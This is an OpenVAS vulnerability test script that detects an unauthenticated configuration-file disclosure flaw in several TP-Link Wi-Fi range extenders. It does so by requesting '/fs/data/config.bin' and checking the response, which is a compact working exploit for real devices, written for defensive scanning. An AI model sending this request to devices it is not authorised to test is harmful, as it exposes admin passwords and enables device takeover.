##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tp_link_file_discl_vuln.nasl 14078 2019-03-11 03:25:53Z ckuersteiner $
#
# TP-Link File Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141383");
  script_version("$Revision: 14078 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-11 04:25:53 +0100 (Mon, 11 Mar 2019) $");
  script_tag(name:"creation_date", value:"2018-08-20 15:05:36 +0700 (Mon, 20 Aug 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("TP-Link File Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("tplink_httpd/banner");

  script_tag(name:"summary", value:"Multiple TP-Link devices are prone to a file disclosure vulnerability where
an unauthenticated attacker may optain the configuration backup file which may contain sensitive data (e.g.
admin password) which could lead to complete compromise of the device.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"TP-Link RE305 v1.0, RE450 v1.0, TL-WA830RE v3.0, TL-WA850RE v2.0,
TL-WA850RE v4.0, TL-WA850RE v5.0, TL-WA855RE v1.0, TL-WA855RE v2.0 and maybe others.");

  script_tag(name:"solution", value:"No known solution is available as of 11th March, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://www.refirmlabs.com/blog/exploiting-command-injection-bugs-tp-link-wl-wa850re-wifi-range-extender");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default: 80);

banner = get_http_banner(port: port);

if ("Server: TP-LINK HTTPD/" >!< banner)
  exit(0);

url = '/fs/data/config.bin';

headers = make_array("X-Requested-With", "XMLHttpRequest");

req = http_get_req(port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && "Content-Type: x-bin/octet-stream" >< res) {
  report = "It was possible to download the backup file 'config.bin' which may contain the admin password.";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
